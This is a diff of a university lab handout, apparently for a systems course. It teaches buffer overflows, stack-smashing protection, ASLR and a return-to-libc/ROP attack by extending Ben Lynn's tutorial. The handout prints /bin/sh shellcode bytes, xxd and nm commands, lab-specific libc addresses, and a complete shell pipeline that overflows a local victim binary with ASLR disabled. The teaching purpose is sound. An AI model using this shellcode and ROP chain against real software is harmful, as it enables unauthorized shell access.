@@ -2,6 +2,8 @@
 
 This week we are going to learn how programs exploit bad programming. In particular, how well-crafted input can force a program to execute something completely different than what it was originally intended to do.
 
+# Part 1: Buffer Overflow #
+
 As you are probably well aware, C gives you total programming power. But with great power, comes great responsibility. One of the biggest problems with C is that many programmers do not check whether the data structures that they allocate in the stack are overflown.
 
 Compile and test the following simple program. Call it `smashing.c`
@@ -40,7 +42,7 @@ Run it again.
 
 **Question 3:** What is the difference now?
 
-# Subjugating a program: returning where we want #
+# Part 2: Stack Subjugation #
 
 You already knew that it is easy to clobber the stack (I am sure you have done it plenty of times). Can we do anything interesting by overwriting the stack? Let us try. Call this program `subjugating.c`. Compile it and run it.
 
@@ -86,7 +88,7 @@ Don't you love that C allows you to define arrays of size zero? (Hint: Fix the c
 
 ## Try Stack-Smashing Protector in this program ##
 
-Enable SSP for this program.
+Enable SSP for this program. (`-fstack-protector` option)
 
 **Question 5** Why doesn't SSP work in this program?
 
@@ -98,7 +100,7 @@ Run the program several times. As you can see, the addresses of the stack change
 
 As you can see, now the stack is always exactly in the same place. This is our second counter-measure to stack overflows.
 
-# Smashing to Subjugate #
+# Part 3: Smashing to Subjugate #
 
 We have learned that we can make a program crash or execute code that is not intended to do. But, can we mix both at the same time? Of course we can. But this time we need to be crafty. And fortuantely Ben Lynn (a PhD graduate from Standford whose area of research is crypto) has created a great tutorial that we can
 reuse. Now head to [https://crypto.stanford.edu/~blynn/rop/](https://crypto.stanford.edu/~blynn/rop/) and do the first part of the exercise (all the way to *The Importance of Being Patched*). I'll simply add to his tutorial in areas that you will probably have trouble understanding.
@@ -113,11 +115,11 @@ b) when you execute the binary of shell.c, type exit to exit it.
 
 c) There is a typo in the command that generates the file `shellcode`.
 
-	xxd -s0x4bf -l32 -p a.out shellcode
+	xxd -s0x4f4 -l32 -p a.out shellcode
 
 It should be the following instead (notice the redirection). Make sure you use the right address
 
-	xxd -s0x4bf -l32 -p a.out > shellcode
+	xxd -s0x4f4 -l32 -p a.out > shellcode
 
 ## System Call ##
 
@@ -151,15 +153,17 @@ needle1: .octa 0xdeadbeef\n\
 
 ## Extracting the Binary ##
 
-The command extracts the given bytes from your binary. Make sure you use the correct offset (in my case it was 0x495). It outputs the values in hexadecimal so we can easily read it.
+The command extracts the given bytes from your binary. Make sure you use the correct offset (in my case it was 0x4f4). It outputs the values in hexadecimal so we can easily read it.
 
-	xxd -s0x495 -l32 -p a.out > shellcode
+	xxd -s0x4f4 -l32 -p a.out > shellcode
 
 Make sure your `shellcode` matches:
 
 	cat shellcode
 	eb0e5f4831c0b03b4831f64831d20f05e8edffffff2f62696e2f736800ef
 	bead
+
+This shellcode is important because we are going to insert that later into the tutorial to make the victim program grant access to the shell.
 
 ## Executable Space Protection (NX) ##
 
@@ -171,35 +175,36 @@ As you learned in the tutorial above, code in the stack cannot be executed. This
 
 ----------
 
-* If you have time...
+# Part 4: Running without ASLR (Optional) #
 
-Do the section /The Importance of Being Patched/. It will show you that it is possible to know the address of the stack we need to attack by using =ps=
+*If you have extra time or want to continue playing around, go ahead and do the following section.*
 
-* If your have more time... or want to keep playing...
+Do the section *The Importance of Being Patched*. It will show you that it is possible to know the address of the stack we need to attack by using `ps`
 
-The rest of the tutorial is fascinating, to say the least.
+The rest of the tutorial is fascinating, to say the least. But we need to fix the tutorial so it works on our version of Linux:
 
-But we need to fix the tutorial so it works on our version of linux:
+1. First, in order to get his attack to work in our lab computers you need to change the sourcecode of `victim.c`. *You need to change the size of the buffer from 64 to 128 bytes.*
+2. The location of the library is `/lib64/libc.so.6`
+3. The addresses of `<system>` and `<exit>` that are extracted  using `nm` are absolute (it means we don't need to add the base)
 
-1. First, in order to get his attack to work in our lab computers you need to change the source
-   code of =victim.c=. *You need to change the size of the buffer from 64 to 128 bytes.*
-2. The location of the library is =/lib64/libc.so.6=
-3. The addresses of =<system>= and =<exit>= that are extracted  using =nm= are absolute (it means we don't need to add the base)
-  #+BEGIN_SRC bash
+``` bash
 nm -D /lib64/libc.so.6 | grep '\<exit\>'   | cut -f1 -d' '
 nm -D /lib64/libc.so.6 | grep '\<system\>' | cut -f1 -d' '
-  #+END_SRC
-4. You need to change the attack string: change =%0130d= to =%0256d= to compensate for the bytes we have added.
-My values are:
-   | base             | 0x000000392ba00000 |
-   | gadget           |            0x20338 |
-   | system           | 0x000000392ba3e900 |
-   | exit             | 0x000000392ba35a50 |
-   | address of array |     0x7fffffffddd0 |
-5. There is an error in his execution of the attack. He does not include any input to the shell command. Try the command below instead (remember to calculate your own
-   values for base, gadget, system, and address of array).
+```
 
-#+BEGIN_SRC bash
+4. You need to change the attack string: change `%0130d` to `%0256d` to compensate for the bytes we have added. My values are:
+
+| Values           | Bytes              |
+|------------------|--------------------|
+| base             | 0x000000392ba00000 |
+| gadget           |            0x20338 |
+| system           | 0x000000392ba3e900 |
+| exit             | 0x000000392ba35a50 |
+| address of array |     0x7fffffffddd0 |
+
+5. There is an error in his execution of the attack. He does not include any input to the shell command. Try the command below instead (remember to calculate your own values for base, gadget, system, and address of array).
+
+``` bash
 ( (
 echo -n /bin/sh | xxd -p
 printf %0258d 0;
@@ -208,38 +213,38 @@ printf %016x 0x7fffffffddd0 | tac -rs..
 printf %016x 0x000000392ba3e900 | tac -rs..
 echo
 ) |  xxd -r -p; echo ; echo ls -lia ) | setarch `arch` -R ./victim
-#+END_SRC
+```
 
 In a nutshell, this is the attack:
 
 The goal is to replace the stack with the following data:
 
-|----------------------------+-------------------------------------------------------------------------|
+| Location                   | Note                                                                    |
+|----------------------------|-------------------------------------------------------------------------|
 | address of function system |                                                                         |
 | address of /bin/sh         |                                                                         |
 | address of gadget          | <- this was the return address of the original call                     |
 | 8 zeros                    | replaces the saved rbp (we never return to main, so it does not matter) |
 | 121 zeros                  | buffer variable (128 bytes)                                             |
 | /bin/sh (7 bytes)          |                                                                         |
-|----------------------------+-------------------------------------------------------------------------|
 
-Let me explain the /gadget/. This is the code that is needed to put the address of =/bin/sh= into =rdi= (execute =pop rdi= then =retq=). These two instructions
-are simply two bytes: 0x5f followed by 0xc3. Ben (the author of the page) shows us that all we need is to find those two bytes /somewhere/ (anywhere) in the
-executable section of the library of libc.  gcc will not complain if we jump to a section of the valid code. This way we avoid /Executable space protection/.
+Let me explain the *gadget*. This is the code that is needed to put the address of `/bin/sh` into `rdi` (execute `pop rdi` then `retq`). These two instructions are simply two bytes: 0x5f followed by 0xc3. Ben (the author of the page) shows us that all we need is to find those two bytes *somewhere* (anywhere) in the executable section of the library of libc.  gcc will not complain if we jump to a section of the valid code. This way we avoid *Executable space protection*.
 
 So here is the play by play:
 
-1. Insert the payload into the stack, replace the  stack as shown above.
-2. Execute the gadget. The gadget pops the top of the stack (containing the address of /bin/sh into the register =rdi=
-3. Executes the return =retq=. The return  address is the address of the =system= function. Control is transferred to it.
-4. =system= behaves as expected. Executes =/bin/sh= (the shell)
-5. At the end of =system= control is transferred to its return address (at the top of the stack),
-6. The return value is invalid, so the program crashes with a segmentation fault. It is easy to fix it. Just add to the attack the address of =exit= and append
-   that to the string that goes into the stack. I'll leave that as an exercise to the reader.
+1. Insert the payload into the stack, replace the stack as shown above.
+2. Execute the gadget. The gadget pops the top of the stack (containing the address of /bin/sh into the register `rdi`
+3. Executes the return `retq`. The return  address is the address of the `system` function. Control is transferred to it.
+4. `system` behaves as expected. Executes `/bin/sh` (the shell)
+5. At the end of `system` control is transferred to its return address (at the top of the stack),
+6. The return value is invalid, so the program crashes with a segmentation fault. It is easy to fix it. Just add to the attack the address of `exit` and append that to the string that goes into the stack. I'll leave that as an exercise to the reader.
 
+	If I were stuck on a desert island with only one compiler, I'd want a C compiler ---Brian Kernighan
 
-#+BEGIN_QUOTE
-If I were stuck on a desert island with only one compiler, I'd want a C compiler ---Brian Kernighan 
-#+END_QUOTE
+Me too! Happy Coding.
 
-Me too. Happy Coding
+# Submission #
+
+You will be submitting one file:
+
+- `report.txt` Your answers to the 7 questions
